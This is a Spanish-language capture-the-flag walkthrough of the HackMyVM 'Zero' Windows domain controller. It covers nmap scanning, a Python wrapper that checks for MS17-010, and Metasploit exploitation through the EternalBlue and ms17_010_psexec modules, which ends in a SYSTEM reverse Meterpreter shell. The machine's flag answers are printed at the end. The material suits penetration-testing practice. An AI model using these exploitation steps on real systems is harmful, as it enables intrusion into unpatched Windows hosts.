---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Zero HackMyVM (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-27 03:29 EDT
Nmap scan report for 192.168.1.155
Host is up (0.00053s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-27 15:29:49Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ZERO)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc        Microsoft Windows RPC
49695/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:1F:34:01 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-27T15:30:37
|_  start_date: 2025-03-27T15:24:26
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: DC01
|   NetBIOS computer name: DC01\x00
|   Domain name: zero.hmv
|   Forest name: zero.hmv
|   FQDN: DC01.zero.hmv
|_  System time: 2025-03-27T08:30:37-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:1f:34:01 (Oracle VirtualBox virtual NIC)
|_clock-skew: mean: 10h19m58s, deviation: 4h02m29s, median: 7h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.18 seconds
```

Vemos que no esta alojado ninguna pagina web, pero si vemos que tiene un servidor `SMB`, vemos que es un `Windows Server 2016`, vamos a ver si pudiera ser vulnerable el servidor `SMB` por la version que pudiera tener.

> detectVuln.py

```python
import subprocess
import re
from rich.console import Console
from rich.panel import Panel

def check_smbv1_vulnerability(ip):
    console = Console()
    console.print(Panel(f"Escaneando [bold yellow]{ip}[/bold yellow] en busca de vulnerabilidad SMBv1 (EternalBlue)...", title="[bold red]SMB Vulnerability Scan[/bold red]", expand=False))

    try:
        result = subprocess.run(["nmap", "-p", "445", "--script", "smb-vuln-ms17-010", ip], capture_output=True, text=True)

        if "VULNERABLE" in result.stdout:
            console.print(Panel("[bold red]¡El sistema es vulnerable a EternalBlue![/bold red] ⚠", title="[bold red]Vulnerabilidad Detectada[/bold red]", expand=False))
        else:
            console.print(Panel("[bold green]El sistema NO es vulnerable a EternalBlue.[/bold green] ✅", title="[bold green]Seguro[/bold green]", expand=False))

    except Exception as e:
        console.print(f"[bold red]Error al ejecutar el escaneo:[/bold red] {e}")

if __name__ == "__main__":
    console = Console()
    ip = console.input("[bold yellow]Introduce la IP a escanear: [/bold yellow]")
    check_smbv1_vulnerability(ip)
```

Lo ejecutaremos de la siguiente forma:

```shell
python3 detectVuln.py
```

Info:

```
Introduce la IP a escanear: 192.168.1.155
╭────────────────────────── SMB Vulnerability Scan ──────────────────────────╮
│ Escaneando 192.168.1.155 en busca de vulnerabilidad SMBv1 (EternalBlue)... │
╰────────────────────────────────────────────────────────────────────────────╯
╭───────── Vulnerabilidad Detectada ─────────╮
│ ¡El sistema es vulnerable a EternalBlue! ⚠ │
╰────────────────────────────────────────────╯
```

Vemos que tiene dicha vulnerabilidad, por lo que vamos a utilizar `metasploit` para esto.

## Escalate Privileges

### Metasploit

```shell
msfconsole -q
```

Vamos a utilizar el `exploit` de `eternalblue`:

```shell
use exploit/windows/smb/ms17_010_eternalblue
```

Lo configuraremos de la siguiente forma:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.1.146:7777 
[*] 192.168.1.155:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.155:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard Evaluation 14393 x64 (64-bit)
[*] 192.168.1.155:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.155:445 - The target is vulnerable.
[*] 192.168.1.155:445 - Connecting to target for exploitation.
[+] 192.168.1.155:445 - Connection established for exploitation.
[+] 192.168.1.155:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.155:445 - CORE raw buffer dump (45 bytes)
[*] 192.168.1.155:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.1.155:445 - 0x00000010  30 31 36 20 53 74 61 6e 64 61 72 64 20 45 76 61  016 Standard Eva
[*] 192.168.1.155:445 - 0x00000020  6c 75 61 74 69 6f 6e 20 31 34 33 39 33           luation 14393   
[+] 192.168.1.155:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.155:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.155:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.155:445 - Starting non-paged pool grooming
[+] 192.168.1.155:445 - Sending SMBv2 buffers
[+] 192.168.1.155:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.155:445 - Sending final SMBv2 buffers.
[*] 192.168.1.155:445 - Sending last fragment of exploit packet!
[*] 192.168.1.155:445 - Receiving response from exploit packet
[+] 192.168.1.155:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.155:445 - Sending egg to corrupted connection.
[*] 192.168.1.155:445 - Triggering free of corrupted buffer.
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.1.155:445 - Connecting to target for exploitation.
[+] 192.168.1.155:445 - Connection established for exploitation.
[+] 192.168.1.155:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.155:445 - CORE raw buffer dump (45 bytes)
[*] 192.168.1.155:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.1.155:445 - 0x00000010  30 31 36 20 53 74 61 6e 64 61 72 64 20 45 76 61  016 Standard Eva
[*] 192.168.1.155:445 - 0x00000020  6c 75 61 74 69 6f 6e 20 31 34 33 39 33           luation 14393   
[+] 192.168.1.155:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.155:445 - Trying exploit with 17 Groom Allocations.
[*] 192.168.1.155:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.155:445 - Starting non-paged pool grooming
[+] 192.168.1.155:445 - Sending SMBv2 buffers
[+] 192.168.1.155:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.155:445 - Sending final SMBv2 buffers.
[*] 192.168.1.155:445 - Sending last fragment of exploit packet!
[*] 192.168.1.155:445 - Receiving response from exploit packet
[+] 192.168.1.155:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.155:445 - Sending egg to corrupted connection.
[*] 192.168.1.155:445 - Triggering free of corrupted buffer.
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 192.168.1.155:445 - Connecting to target for exploitation.
[+] 192.168.1.155:445 - Connection established for exploitation.
[+] 192.168.1.155:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.155:445 - CORE raw buffer dump (45 bytes)
[*] 192.168.1.155:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.1.155:445 - 0x00000010  30 31 36 20 53 74 61 6e 64 61 72 64 20 45 76 61  016 Standard Eva
[*] 192.168.1.155:445 - 0x00000020  6c 75 61 74 69 6f 6e 20 31 34 33 39 33           luation 14393   
[+] 192.168.1.155:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.155:445 - Trying exploit with 22 Groom Allocations.
[*] 192.168.1.155:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.155:445 - Starting non-paged pool grooming
[+] 192.168.1.155:445 - Sending SMBv2 buffers
[+] 192.168.1.155:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.155:445 - Sending final SMBv2 buffers.
[*] 192.168.1.155:445 - Sending last fragment of exploit packet!
[*] 192.168.1.155:445 - Receiving response from exploit packet
[+] 192.168.1.155:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.155:445 - Sending egg to corrupted connection.
[*] 192.168.1.155:445 - Triggering free of corrupted buffer.
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.1.155:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.
```

Vemos que si es vulnerable, pero por alguna razon esta fallando, por lo que podremos seguir buscando `exploits` asociados a la vulnerabilidad de `MS17-010`, si buscamos por dicha `vulnerabilidad` veremos lo siguiente:

```shell
search MS17-010
```

Info:

```
Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```

Vemos que hay `4` modulos, el primero es el que hemos probado del `ms17_010_eternalblue` vamos a probar el modulo del `ms17_010_psexec`.

```shell
use exploit/windows/smb/ms17_010_psexec
```

Ahora lo configuraremos de la siguiente forma:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
exploit
```

Si dejamos los campos vacios de `SMBUser` y `SMBPass` para hacerlo de forma anonima, pero si lo dejamos asi tal cual el `target` en automatico, veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.1.146:4444 
[*] 192.168.1.155:445 - Target OS: Windows Server 2016 Standard Evaluation 14393
[*] 192.168.1.155:445 - Built a write-what-where primitive...
[+] 192.168.1.155:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.1.155:445 - Executing the payload...
[+] 192.168.1.155:445 - Service start timed out, OK if running a command or non-service executable...
[*] Exploit completed, but no session was created.
```

Hace el intento de crear una `reverse shell` pero no lo consigue ya que el `Windows Defender` lo puede estar bloqueando, por lo que vamos a utilizar otro `target` que sea mas discreto.

```shell
show targets
```

Info:

```
Exploit targets:
=================

    Id  Name
    --  ----
	0   Automatic
    1   PowerShell
=>  2   Native upload
    3   MOF upload
```

Vamos a utilizar el `Native upload` para subir un archivo de forma automatica y que se nos genere una `reverse shell`:

```shell
set target 2
```

Ahora si lo volvemos a ejecutar con `exploit` veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.1.146:4444 
[*] 192.168.1.155:445 - Target OS: Windows Server 2016 Standard Evaluation 14393
[*] 192.168.1.155:445 - Built a write-what-where primitive...
[+] 192.168.1.155:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.1.155:445 - Uploading payload... GbsRXBhV.exe
[*] 192.168.1.155:445 - Created \GbsRXBhV.exe...
[+] 192.168.1.155:445 - Service started successfully...
[*] 192.168.1.155:445 - Deleting \GbsRXBhV.exe...
[-] 192.168.1.155:445 - Delete of \GbsRXBhV.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)
[*] Sending stage (177734 bytes) to 192.168.1.155
[*] Meterpreter session 1 opened (192.168.1.146:4444 -> 192.168.1.155:49834) at 2025-03-27 03:57:45 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Vemos que ha funcionado y entraremos directamente como `NT AUTHORITY\SYSTEM` por lo que habremos terminado la maquina, leeremos las `flags`.

> user.txt

```
HMV{D0nt_r3us3_p4$$w0rd5!}
```

> root.txt

```
HMV{Z3r0_l0g0n_!s_Pr3tty_D4ng3r0u$}
```
